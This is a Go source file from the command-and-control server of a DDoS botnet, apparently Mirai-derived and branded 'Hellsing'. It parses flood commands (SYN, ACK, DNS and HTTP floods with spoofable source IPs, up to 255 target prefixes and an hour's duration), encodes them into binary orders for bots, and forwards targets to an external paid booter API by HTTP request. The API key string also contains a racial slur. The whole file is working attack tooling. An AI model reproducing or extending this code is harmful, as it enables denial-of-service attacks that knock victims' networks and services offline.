package cnc

import (
	"encoding/binary"
	"errors"
	"fmt"
	"net"
	"net/http"
	"strconv"
	"strings"

	"github.com/mattn/go-shellwords"
)

type AttackInfo struct {
	AttackID          uint8
	AttackFlags       []uint8
	AttackDescription string
}

type Attack struct {
	API       string
	APIAttack bool
	ApiType   string
	Duration  uint32
	Type      uint8
	Targets   map[uint32]uint8 // Prefix/netmask
	Flags     map[uint8]string // key=value
}

type apiAttackInfo struct {
	attackID   uint8
	attackName string
	attackLink string
}

type FlagInfo struct {
	flagID          uint8
	flagDescription string
}

var apiFlagInfoLookup map[string]FlagInfo = map[string]FlagInfo{
	"dport": FlagInfo{
		0,
		"Destination Port",
	},
}

var flagInfoLookup map[string]FlagInfo = map[string]FlagInfo{
	"len": FlagInfo{
		0,
		"Size of packet data, default is 512 bytes",
	},
	"rand": FlagInfo{
		1,
		"Randomize packet data content, default is 1 (yes)",
	},
	"tos": FlagInfo{
		2,
		"TOS field value in IP header, default is 0",
	},
	"ident": FlagInfo{
		3,
		"ID field value in IP header, default is random",
	},
	"ttl": FlagInfo{
		4,
		"TTL field in IP header, default is 255",
	},
	"df": FlagInfo{
		5,
		"Set the Dont-Fragment bit in IP header, default is 0 (no)",
	},
	"sport": FlagInfo{
		6,
		"Source port, default is random",
	},
	"dport": FlagInfo{
		7,
		"Destination port, default is random",
	},
	"domain": FlagInfo{
		8,
		"Domain name to attack",
	},
	"dhid": FlagInfo{
		9,
		"Domain name transaction ID, default is random",
	},
	"urg": FlagInfo{
		11,
		"Set the URG bit in IP header, default is 0 (no)",
	},
	"ack": FlagInfo{
		12,
		"Set the ACK bit in IP header, default is 0 (no) except for ACK flood",
	},
	"psh": FlagInfo{
		13,
		"Set the PSH bit in IP header, default is 0 (no)",
	},
	"rst": FlagInfo{
		14,
		"Set the RST bit in IP header, default is 0 (no)",
	},
	"syn": FlagInfo{
		15,
		"Set the ACK bit in IP header, default is 0 (no) except for SYN flood",
	},
	"fin": FlagInfo{
		16,
		"Set the FIN bit in IP header, default is 0 (no)",
	},
	"seqnum": FlagInfo{
		17,
		"Sequence number value in TCP header, default is random",
	},
	"acknum": FlagInfo{
		18,
		"Ack number value in TCP header, default is random",
	},
	"gcip": FlagInfo{
		19,
		"Set internal IP to destination ip, default is 0 (no)",
	},
	"method": FlagInfo{
		20,
		"HTTP method name, default is get",
	},
	"postdata": FlagInfo{
		21,
		"POST data, default is empty/none",
	},
	"path": FlagInfo{
		22,
		"HTTP path, default is /",
	},
	/*"ssl": FlagInfo {
	      23,
	      "Use HTTPS/SSL"
	  },
	*/
	"conns": FlagInfo{
		24,
		"Number of connections",
	},
	"source": FlagInfo{
		25,
		"Source IP address, 255.255.255.255 for random",
	},
}

var apiFlags map[string]string = map[string]string{
	"<<$pps>>":      "pps",
	"<<$duration>>": "duration",
	"<<$target>>":   "host",
}

var apiAttackInfoLookup map[string]apiAttackInfo = map[string]apiAttackInfo{
	".ovhflood": apiAttackInfo{
		3,
		"OVH-V2",
		"https://api.downed.rip/api?key=nope nigga&host=<<$target>>&port=<<$port>>&method=<<$method>>&time=<<$duration>>&pps=1000000&threads=3",
	},
}

var AttackInfoLookup map[string]*AttackInfo = make(map[string]*AttackInfo)

func uint8InSlice(a uint8, list []uint8) bool {
	for _, b := range list {
		if b == a {
			return true
		}
	}
	return false
}

func NewDiscordAttack(str string, admin int) (*Attack, error) {
	atk := &Attack{"", false, "" /*API SHIT*/, 0, 0, make(map[uint32]uint8), make(map[uint8]string)}
	args, _ := shellwords.Parse(str)

	var atkInfo *AttackInfo
	var apiAtkInfo apiAttackInfo
	// Parse attack name
	var atkname string
	if len(args) == 0 {
		return nil, errors.New("Must specify an attack name")
	} else {
		if args[0] == "?" {
			validCmdList := "\x1b[0;36mavailable methods:\r\n\x1b[1;35m"
			for cmdName, atkInfo := range AttackInfoLookup {
				validCmdList += cmdName + ": " + atkInfo.AttackDescription + "\r\n"
			}
			for apicmdName, _ := range apiAttackInfoLookup {
				validCmdList += apicmdName + "\r\n"
			}
			return nil, errors.New(validCmdList)
		}
		var exists bool
		var existsapi bool
		atkInfo, exists = AttackInfoLookup[args[0]]
		apiAtkInfo, existsapi = apiAttackInfoLookup[args[0]]
		if !exists && !existsapi {
			return nil, errors.New(fmt.Sprintf("\"%s\" Is not a valid command.", args[0]))
		}
		atkname = args[0]

		atk.Type = atkInfo.AttackID
		atk.ApiType = apiAtkInfo.attackName
		atk.API = apiAtkInfo.attackLink
		atk.APIAttack = existsapi
		args = args[1:]
	}

	// Parse targets
	if len(args) == 0 {
		return nil, errors.New("Attack Must Specify prefix/netmast ex. (\"" + atkname + " 1.1.1.1/32 20 dport=80\").")
	} else {
		if args[0] == "?" {
			return nil, errors.New("Comma delimited list of target prefixes\r\nEx: 192.168.0.1\r\nEx: 191.121.50.19/8\r\nEx: 8.8.8.8,127.0.0.0/29")
		}
		cidrArgs := strings.Split(args[0], ",")
		if len(cidrArgs) > 255 {
			return nil, errors.New("Cannot specify more than 255 targets in a single attack!")
		}
		for _, cidr := range cidrArgs {
			prefix := ""
			netmask := uint8(32)
			cidrInfo := strings.Split(cidr, "/")
			if len(cidrInfo) == 0 {
				return nil, errors.New("Blank target specified!")
			}
			prefix = cidrInfo[0]
			if len(cidrInfo) == 2 {
				netmaskTmp, err := strconv.Atoi(cidrInfo[1])
				if err != nil || netmask > 32 || netmask < 0 {
					return nil, errors.New(fmt.Sprintf("Invalid netmask was supplied, near %s", cidr))
				}
				netmask = uint8(netmaskTmp)
			} else if len(cidrInfo) > 2 {
				return nil, errors.New(fmt.Sprintf("Too many /'s in prefix, near %s", cidr))
			}

			ip := net.ParseIP(prefix)
			if ip == nil {
				return nil, errors.New(fmt.Sprintf("Failed to parse IP address, near %s", cidr))
			}
			atk.Targets[binary.BigEndian.Uint32(ip[12:])] = netmask
		}
		args = args[1:]
	}

	// Parse attack duration time
	if len(args) == 0 {
		return nil, errors.New("must specify an attack duration")
	} else {
		if args[0] == "?" {
			return nil, errors.New("Duration of the attack, in seconds")
		}
		duration, err := strconv.Atoi(args[0])
		if err != nil || duration == 0 || duration > 3600 {
			return nil, errors.New(fmt.Sprintf("Invalid attack duration, near %s. Duration must be between 0 and 3600 seconds", args[0]))
		}
		atk.Duration = uint32(duration)
		args = args[1:]
	}
	if atk.APIAttack == false {
		// Parse flags
		for len(args) > 0 {
			if args[0] == "?" {
				validFlags := "List of flags key=val seperated by spaces. Valid flags for this method are\r\n\r\n"
				for _, flagID := range atkInfo.AttackFlags {
					for flagName, flagInfo := range flagInfoLookup {
						if flagID == flagInfo.flagID {
							validFlags += flagName + ": " + flagInfo.flagDescription + "\r\n"
							break
						}
					}
				}
				validFlags += "\r\nValue of 65535 for a flag denotes random (for ports, etc)\r\n"
				validFlags += "Ex: seq=0\r\nEx: sport=0 dport=65535"
				return nil, errors.New(validFlags)
			}
			flagSplit := strings.SplitN(args[0], "=", 2)
			if len(flagSplit) != 2 {
				return nil, errors.New(fmt.Sprintf("The \"%s\" flag requires a argument.", args[0]))
			}
			flagInfo, exists := flagInfoLookup[flagSplit[0]]
			if !exists || !uint8InSlice(flagInfo.flagID, atkInfo.AttackFlags) || (admin == 0 && flagInfo.flagID == 25) {
				return nil, errors.New(fmt.Sprintf("The \"%s\" (%s) flag Key is  Invalid.", flagSplit[0], args[0]))
			}
			if flagSplit[1][0] == '"' {
				flagSplit[1] = flagSplit[1][1 : len(flagSplit[1])-1]
				fmt.Println(flagSplit[1])
			}
			if flagSplit[1] == "true" {
				flagSplit[1] = "1"
			} else if flagSplit[1] == "false" {
				flagSplit[1] = "0"
			}
			atk.Flags[uint8(flagInfo.flagID)] = flagSplit[1]
			args = args[1:]
		}
		if len(atk.Flags) > 255 {
			return nil, errors.New("Cannot have more than 255 flags")
		}
	}
	for len(args) > 0 {
		if args[0] == "?" {
			validFlags := "List of flags key=val seperated by spaces. Valid flags for this method are\r\n\r\n"
			for _, flagID := range atkInfo.AttackFlags {
				for flagName, flagInfo := range apiFlagInfoLookup {
					if flagID == flagInfo.flagID {
						validFlags += flagName + ": " + flagInfo.flagDescription + "\r\n"
						break
					}
				}
			}
			validFlags += "\r\nValue of 65535 for a flag denotes random (for ports, etc)\r\n"
			validFlags += "Ex: seq=0\r\nEx: sport=0 dport=65535"
			return nil, errors.New(validFlags)
		}
		flagSplit := strings.SplitN(args[0], "=", 2)
		if len(flagSplit) != 2 {
			return nil, errors.New(fmt.Sprintf("The \"%s\" flag requires a argument.", args[0]))
		}
		flagInfo, exists := apiFlagInfoLookup[flagSplit[0]]
		if !exists || (admin == 0 && flagInfo.flagID == 25) {
			return nil, errors.New(fmt.Sprintf("mThe \"%s\" (%s) flag Key is  Invalid.", flagSplit[0], args[0]))
		}
		if flagSplit[1][0] == '"' {
			flagSplit[1] = flagSplit[1][1 : len(flagSplit[1])-1]
			fmt.Println(flagSplit[1])
		}
		if flagSplit[1] == "true" {
			flagSplit[1] = "1"
		} else if flagSplit[1] == "false" {
			flagSplit[1] = "0"
		}
		atk.Flags[uint8(flagInfo.flagID)] = flagSplit[1]
		args = args[1:]
	}
	if len(atk.Flags) > 255 {
		return nil, errors.New("Cannot have more than 255 flags")
	}
	return atk, nil
}
func NewAttack(str string, admin int) (*Attack, error) {
	atk := &Attack{"", false, "" /*API SHIT*/, 0, 0, make(map[uint32]uint8), make(map[uint8]string)}
	args, _ := shellwords.Parse(str)

	var atkInfo *AttackInfo
	var apiAtkInfo apiAttackInfo
	// Parse attack name
	var atkname string
	if len(args) == 0 {
		return nil, errors.New("Must specify an attack name")
	} else {
		if args[0] == "?" {
			validCmdList := "\x1b[0;36mavailable methods:\r\n\x1b[1;35m"
			for cmdName, atkInfo := range AttackInfoLookup {
				validCmdList += cmdName + ": " + atkInfo.AttackDescription + "\r\n"
			}
			for apicmdName, _ := range apiAttackInfoLookup {
				validCmdList += apicmdName + "\r\n"
			}
			return nil, errors.New(validCmdList)
		}
		var exists bool
		var existsapi bool
		atkInfo, exists = AttackInfoLookup[args[0]]
		apiAtkInfo, existsapi = apiAttackInfoLookup[args[0]]
		if !exists && !existsapi {
			return nil, errors.New(fmt.Sprintf("\033[33;1m\"%s\" Is not a valid command.", args[0]))
		}
		atkname = args[0]
		if exists {
			atk.Type = atkInfo.AttackID
		}
		if existsapi {
			atk.ApiType = apiAtkInfo.attackName
			atk.API = apiAtkInfo.attackLink
			atk.APIAttack = existsapi
		}
		args = args[1:]
	}

	// Parse targets
	if len(args) == 0 {
		return nil, errors.New("\033[33;1mAttack Must Specify prefix/netmast ex. (\"\033[4m" + atkname + " 1.1.1.1/32 20 dport=80\033[0m\033[33;1m\").")
	} else {
		if args[0] == "?" {
			return nil, errors.New("\033[37;1mComma delimited list of target prefixes\r\nEx: 192.168.0.1\r\nEx: 191.121.50.19/8\r\nEx: 8.8.8.8,127.0.0.0/29")
		}
		cidrArgs := strings.Split(args[0], ",")
		if len(cidrArgs) > 255 {
			return nil, errors.New("Cannot specify more than 255 targets in a single attack!")
		}
		for _, cidr := range cidrArgs {
			prefix := ""
			netmask := uint8(32)
			cidrInfo := strings.Split(cidr, "/")
			if len(cidrInfo) == 0 {
				return nil, errors.New("Blank target specified!")
			}
			prefix = cidrInfo[0]
			if len(cidrInfo) == 2 {
				netmaskTmp, err := strconv.Atoi(cidrInfo[1])
				if err != nil || netmask > 32 || netmask < 0 {
					return nil, errors.New(fmt.Sprintf("Invalid netmask was supplied, near %s", cidr))
				}
				netmask = uint8(netmaskTmp)
			} else if len(cidrInfo) > 2 {
				return nil, errors.New(fmt.Sprintf("Too many /'s in prefix, near %s", cidr))
			}

			ip := net.ParseIP(prefix)
			if ip == nil {
				return nil, errors.New(fmt.Sprintf("Failed to parse IP address, near %s", cidr))
			}
			atk.Targets[binary.BigEndian.Uint32(ip[12:])] = netmask
		}
		args = args[1:]
	}

	// Parse attack duration time
	if len(args) == 0 {
		return nil, errors.New("must specify an attack duration")
	} else {
		if args[0] == "?" {
			return nil, errors.New("\033[37;1mDuration of the attack, in seconds")
		}
		duration, err := strconv.Atoi(args[0])
		if err != nil || duration == 0 || duration > 3600 {
			return nil, errors.New(fmt.Sprintf("Invalid attack duration, near %s. Duration must be between 0 and 3600 seconds", args[0]))
		}
		atk.Duration = uint32(duration)
		args = args[1:]
	}
	if atk.APIAttack == false {
		// Parse flags
		for len(args) > 0 {
			if args[0] == "?" {
				validFlags := "\033[37;1mList of flags key=val seperated by spaces. Valid flags for this method are\r\n\r\n"
				for _, flagID := range atkInfo.AttackFlags {
					for flagName, flagInfo := range flagInfoLookup {
						if flagID == flagInfo.flagID {
							validFlags += flagName + ": " + flagInfo.flagDescription + "\r\n"
							break
						}
					}
				}
				validFlags += "\r\nValue of 65535 for a flag denotes random (for ports, etc)\r\n"
				validFlags += "Ex: seq=0\r\nEx: sport=0 dport=65535"
				return nil, errors.New(validFlags)
			}
			flagSplit := strings.SplitN(args[0], "=", 2)
			if len(flagSplit) != 2 {
				return nil, errors.New(fmt.Sprintf("\033[33;1mThe \"%s\" flag requires a argument.", args[0]))
			}
			flagInfo, exists := flagInfoLookup[flagSplit[0]]
			if !exists || !uint8InSlice(flagInfo.flagID, atkInfo.AttackFlags) || (admin == 0 && flagInfo.flagID == 25) {
				return nil, errors.New(fmt.Sprintf("\033[33;1mThe \"%s\" (%s) flag Key is  Invalid.", flagSplit[0], args[0]))
			}
			if flagSplit[1][0] == '"' {
				flagSplit[1] = flagSplit[1][1 : len(flagSplit[1])-1]
				fmt.Println(flagSplit[1])
			}
			if flagSplit[1] == "true" {
				flagSplit[1] = "1"
			} else if flagSplit[1] == "false" {
				flagSplit[1] = "0"
			}
			atk.Flags[uint8(flagInfo.flagID)] = flagSplit[1]
			args = args[1:]
		}
		if len(atk.Flags) > 255 {
			return nil, errors.New("Cannot have more than 255 flags")
		}
	}
	for len(args) > 0 {
		if args[0] == "?" {
			validFlags := "\033[37;1mList of flags key=val seperated by spaces. Valid flags for this method are\r\n\r\n"
			for _, flagID := range atkInfo.AttackFlags {
				for flagName, flagInfo := range apiFlagInfoLookup {
					if flagID == flagInfo.flagID {
						validFlags += flagName + ": " + flagInfo.flagDescription + "\r\n"
						break
					}
				}
			}
			validFlags += "\r\nValue of 65535 for a flag denotes random (for ports, etc)\r\n"
			validFlags += "Ex: seq=0\r\nEx: sport=0 dport=65535"
			return nil, errors.New(validFlags)
		}
		flagSplit := strings.SplitN(args[0], "=", 2)
		if len(flagSplit) != 2 {
			return nil, errors.New(fmt.Sprintf("\033[33;1mThe \"%s\" flag requires a argument.", args[0]))
		}
		flagInfo, exists := apiFlagInfoLookup[flagSplit[0]]
		if !exists || (admin == 0 && flagInfo.flagID == 25) {
			return nil, errors.New(fmt.Sprintf("\033[33;1mThe \"%s\" (%s) flag Key is  Invalid.", flagSplit[0], args[0]))
		}
		if flagSplit[1][0] == '"' {
			flagSplit[1] = flagSplit[1][1 : len(flagSplit[1])-1]
			fmt.Println(flagSplit[1])
		}
		if flagSplit[1] == "true" {
			flagSplit[1] = "1"
		} else if flagSplit[1] == "false" {
			flagSplit[1] = "0"
		}
		atk.Flags[uint8(flagInfo.flagID)] = flagSplit[1]
		args = args[1:]
	}
	if len(atk.Flags) > 255 {
		return nil, errors.New("Cannot have more than 255 flags")
	}
	return atk, nil
}

func (this *Attack) Build() ([]byte, error) {
	if this.APIAttack == false {
		buf := make([]byte, 0)
		var tmp []byte

		// Add in attack duration
		tmp = make([]byte, 4)
		binary.BigEndian.PutUint32(tmp, this.Duration)
		buf = append(buf, tmp...)

		// Add in attack type
		fmt.Println("[" + Fade([]int{191, 0, 0}, []int{255, 255, 255}, "Hellsing") + "]: [" + fmt.Sprintf("%d", this.Type) + "]")
		buf = append(buf, byte(this.Type))

		// Send number of targets
		buf = append(buf, byte(len(this.Targets)))

		// Send targets
		for prefix, netmask := range this.Targets {
			tmp = make([]byte, 5)
			binary.BigEndian.PutUint32(tmp, prefix)
			tmp[4] = byte(netmask)
			buf = append(buf, tmp...)
		}

		// Send number of flags
		buf = append(buf, byte(len(this.Flags)))

		// Send flags
		for key, val := range this.Flags {
			tmp = make([]byte, 2)
			tmp[0] = key
			strbuf := []byte(val)
			if len(strbuf) > 255 {
				return nil, errors.New("Flag value cannot be more than 255 bytes!")
			}
			tmp[1] = uint8(len(strbuf))
			tmp = append(tmp, strbuf...)
			buf = append(buf, tmp...)
		}

		// Specify the total length
		if len(buf) > 4096 {
			return nil, errors.New("Max buffer is 4096")
		}
		tmp = make([]byte, 2)
		binary.BigEndian.PutUint16(tmp, uint16(len(buf)+2))
		buf = append(tmp, buf...)

		return buf, nil
	} else {
		for prefix, _ := range this.Targets {
			targip := make(net.IP, 4)
			binary.BigEndian.PutUint32(targip, prefix)
			fmt.Println(fmt.Sprintf("%s", targip))
			this.API = strings.ReplaceAll(this.API, "<<$target>>", fmt.Sprintf("%s", targip))
		}
		this.API = strings.ReplaceAll(this.API, "<<$method>>", fmt.Sprintf("%s", this.ApiType))
		for key, val := range this.Flags {
			if key == 0 {
				this.API = strings.ReplaceAll(this.API, "<<$port>>", fmt.Sprintf("%s", val))
			}
		}
		this.API = strings.ReplaceAll(this.API, "<<$duration>>", fmt.Sprintf("%d", this.Duration))
		resp, err := http.Get(this.API)
		if err != nil {
			return []byte("APIATTACK"), errors.New(Fade([]int{191, 0, 0}, []int{255, 255, 255}, fmt.Sprint("[API]: [There was an error processing the request (Dial Timeout)]")))
		}
		if resp.StatusCode != 200 {
			return nil, errors.New(Fade([]int{191, 0, 0}, []int{255, 255, 255}, fmt.Sprint("[API]: [API Http code ("+fmt.Sprint(resp.StatusCode)+")]")))
		}
		return []byte(this.API), nil
	}
	return nil, nil
}

func LaunchAPI(apilink string) error {
	resp, err := http.Get(apilink)
	if err != nil {
		return errors.New(Fade([]int{191, 0, 0}, []int{255, 255, 255}, fmt.Sprint("[API]: [There was an error processing the request (Dial Timeout)]")))
	}
	if resp.StatusCode != 200 {
		return errors.New(Fade([]int{191, 0, 0}, []int{255, 255, 255}, fmt.Sprint("[API]: [API Http code ("+fmt.Sprint(resp.StatusCode)+")]")))
	}
	return nil
}
